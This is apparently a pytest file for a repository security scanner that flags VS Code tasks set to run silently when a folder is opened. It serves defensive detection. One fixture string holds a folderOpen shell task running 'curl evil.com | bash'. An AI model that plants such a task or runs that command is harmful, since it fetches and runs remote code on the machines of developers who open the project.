"""
Tests for vscode_scanner module — Module 3.

FlexPay fixture loaded from disk. Clean repo fixture loaded from disk.
No network calls.
"""

import os
from unittest.mock import Mock

from repo_guard.models import Severity
from repo_guard.modules.vscode_scanner import scan

FIXTURES_DIR = os.path.join(os.path.dirname(__file__), "fixtures")
FLEXPAY_DIR = os.path.join(FIXTURES_DIR, "flexpay_mock")
CLEAN_DIR = os.path.join(FIXTURES_DIR, "clean_repo")


def _load_fixture_file(relative_path: str, base_dir: str) -> str:
    file_path = os.path.join(base_dir, relative_path)
    with open(file_path, "r") as f:
        return f.read()


# ---------------------------------------------------------------------------
# FlexPay fixture — must trigger CRITICAL
# ---------------------------------------------------------------------------


class TestVscodeScannerFlexPay:
    """FlexPay has both tasks.json (runOn: folderOpen) and settings.json (allowAutomaticTasks)."""

    def test_flexpay_detects_folder_open_task(self):
        """FlexPay tasks.json has runOn: folderOpen with a shell command."""
        tasks_content = _load_fixture_file(".vscode/tasks.json", FLEXPAY_DIR)
        settings_content = _load_fixture_file(".vscode/settings.json", FLEXPAY_DIR)

        client = Mock()
        # Simulate get_file_content returning the fixture content for each file.
        def get_file_content_side_effect(owner, repo, path):
            if path == ".vscode/tasks.json":
                return tasks_content
            elif path == ".vscode/settings.json":
                return settings_content
            return None

        client.get_file_content.side_effect = get_file_content_side_effect

        result = scan(client, "flexpay", "repo")
        assert result.module_name == "vscode_scanner"
        assert result.severity == Severity.CRITICAL

        # Should find runOn: folderOpen findings.
        folder_open = [f for f in result.findings if "folderOpen" in f.message]
        assert len(folder_open) >= 1

        # Should find allowAutomaticTasks finding.
        auto_tasks = [f for f in result.findings if "allowAutomaticTasks" in f.message]
        assert len(auto_tasks) >= 1

    def test_flexpay_both_flags_together_is_critical(self):
        """Both folderOpen + allowAutomaticTasks should produce a combined CRITICAL finding."""
        tasks_content = _load_fixture_file(".vscode/tasks.json", FLEXPAY_DIR)
        settings_content = _load_fixture_file(".vscode/settings.json", FLEXPAY_DIR)

        client = Mock()
        def get_file_content_side_effect(owner, repo, path):
            if path == ".vscode/tasks.json":
                return tasks_content
            elif path == ".vscode/settings.json":
                return settings_content
            return None
        client.get_file_content.side_effect = get_file_content_side_effect

        result = scan(client, "flexpay", "repo")
        combined = [f for f in result.findings if "Both" in f.message and "allowAutomaticTasks" in f.message]
        assert len(combined) >= 1

    def test_flexpay_presentation_suppression_detected(self):
        """FlexPay tasks.json has reveal: silent, echo: false, focus: false."""
        tasks_content = _load_fixture_file(".vscode/tasks.json", FLEXPAY_DIR)
        settings_content = _load_fixture_file(".vscode/settings.json", FLEXPAY_DIR)

        client = Mock()
        def get_file_content_side_effect(owner, repo, path):
            if path == ".vscode/tasks.json":
                return tasks_content
            elif path == ".vscode/settings.json":
                return settings_content
            return None
        client.get_file_content.side_effect = get_file_content_side_effect

        result = scan(client, "flexpay", "repo")
        # The folderOpen finding should be CRITICAL due to presentation suppression.
        # Exclude the combined "Both" finding which is added separately.
        folder_open = [f for f in result.findings if "runOn: folderOpen" in f.message and "Both" not in f.message]
        assert len(folder_open) >= 1
        for f in folder_open:
            assert f.severity == Severity.CRITICAL
            details = f.details
            assert details.get("presentation_reveal") == "silent"
            assert details.get("presentation_echo") is False
            assert details.get("presentation_focus") is False

    def test_flexpay_context_note_included(self):
        """The VS Code version context note should appear."""
        tasks_content = _load_fixture_file(".vscode/tasks.json", FLEXPAY_DIR)
        settings_content = _load_fixture_file(".vscode/settings.json", FLEXPAY_DIR)

        client = Mock()
        def get_file_content_side_effect(owner, repo, path):
            if path == ".vscode/tasks.json":
                return tasks_content
            elif path == ".vscode/settings.json":
                return settings_content
            return None
        client.get_file_content.side_effect = get_file_content_side_effect

        result = scan(client, "flexpay", "repo")
        # The context note is stored in the combined finding's details.
        context_findings = [f for f in result.findings if "VS Code 1.109" in str(f.details.get("note", ""))]
        assert len(context_findings) >= 1


# ---------------------------------------------------------------------------
# Clean repo fixture — must return CLEAN
# ---------------------------------------------------------------------------


class TestVscodeScannerClean:
    """Clean repo has settings.json without auto-execution, and no tasks.json."""

    def test_clean_repo_no_tasks_json(self):
        """No tasks.json should produce a CLEAN finding noting its absence."""
        settings_content = _load_fixture_file(".vscode/settings.json", CLEAN_DIR)

        client = Mock()
        def get_file_content_side_effect(owner, repo, path):
            if path == ".vscode/tasks.json":
                return None  # File doesn't exist
            elif path == ".vscode/settings.json":
                return settings_content
            return None
        client.get_file_content.side_effect = get_file_content_side_effect

        result = scan(client, "owner", "clean-repo")
        # The clean repo should be CLEAN or at most INFO.
        assert result.severity in (Severity.CLEAN, Severity.INFO)
        missing_tasks = [f for f in result.findings if "No .vscode/tasks.json" in f.message]
        assert len(missing_tasks) >= 1

    def test_clean_repo_no_auto_execution_flags(self):
        """Clean repo's settings.json has no allowAutomaticTasks."""
        settings_content = _load_fixture_file(".vscode/settings.json", CLEAN_DIR)

        client = Mock()
        def get_file_content_side_effect(owner, repo, path):
            if path == ".vscode/tasks.json":
                return None
            elif path == ".vscode/settings.json":
                return settings_content
            return None
        client.get_file_content.side_effect = get_file_content_side_effect

        result = scan(client, "owner", "clean-repo")
        auto_tasks = [f for f in result.findings if "allowAutomaticTasks" in f.message]
        assert len(auto_tasks) == 0


# ---------------------------------------------------------------------------
# Individual pattern tests
# ---------------------------------------------------------------------------


class TestVscodeScannerPatterns:
    """Test specific flag patterns in isolation."""

    def test_folder_open_without_command_is_warning(self):
        """runOn: folderOpen without a shell command should be WARNING."""
        tasks_json = '{"version":"2.0.0","tasks":[{"label":"test","runOn":"folderOpen","type":"npm"}]}'
        client = Mock()
        client.get_file_content.side_effect = lambda o, r, p: tasks_json if p == ".vscode/tasks.json" else None

        result = scan(client, "o", "r")
        folder_open = [f for f in result.findings if "folderOpen" in f.message]
        assert len(folder_open) >= 1
        # Without a shell command or suppression, it's WARNING.
        for f in folder_open:
            assert f.severity in (Severity.WARNING, Severity.CRITICAL)

    def test_folder_open_with_shell_command_is_critical(self):
        """runOn: folderOpen + shell command should be CRITICAL."""
        tasks_json = '{"version":"2.0.0","tasks":[{"label":"evil","runOn":"folderOpen","type":"shell","command":"curl evil.com | bash"}]}'
        client = Mock()
        client.get_file_content.side_effect = lambda o, r, p: tasks_json if p == ".vscode/tasks.json" else None

        result = scan(client, "o", "r")
        folder_open = [f for f in result.findings if "folderOpen" in f.message]
        assert len(folder_open) >= 1
        for f in folder_open:
            assert f.severity == Severity.CRITICAL

    def test_allow_automatic_tasks_is_warning(self):
        """settings.json with allowAutomaticTasks: on should be WARNING."""
        settings_json = '{"task.allowAutomaticTasks":"on"}'
        client = Mock()
        client.get_file_content.side_effect = lambda o, r, p: settings_json if p == ".vscode/settings.json" else None

        result = scan(client, "o", "r")
        auto_tasks = [f for f in result.findings if "allowAutomaticTasks" in f.message]
        assert len(auto_tasks) >= 1
        assert auto_tasks[0].severity == Severity.WARNING

    def test_silent_presentation_is_critical(self):
        """reveal: silent in presentation should escalate to CRITICAL."""
        tasks_json = '{"version":"2.0.0","tasks":[{"label":"t","runOn":"folderOpen","command":"echo hi","presentation":{"reveal":"silent"}}]}'
        client = Mock()
        client.get_file_content.side_effect = lambda o, r, p: tasks_json if p == ".vscode/tasks.json" else None

        result = scan(client, "o", "r")
        folder_open = [f for f in result.findings if "folderOpen" in f.message]
        assert len(folder_open) >= 1
        assert folder_open[0].severity == Severity.CRITICAL
        assert folder_open[0].details.get("presentation_reveal") == "silent"

    def test_neither_file_exists_returns_clean(self):
        """No .vscode directory at all should return CLEAN."""
        client = Mock()
        client.get_file_content.return_value = None

        result = scan(client, "o", "r")
        assert result.severity == Severity.CLEAN

    def test_malformed_json_does_not_crash(self):
        """Invalid JSON in tasks.json should produce an INFO finding, not crash."""
        client = Mock()
        client.get_file_content.side_effect = lambda o, r, p: "{invalid json}" if p == ".vscode/tasks.json" else None

        result = scan(client, "o", "r")
        parse_errors = [f for f in result.findings if "not valid JSON" in f.message]
        assert len(parse_errors) >= 1
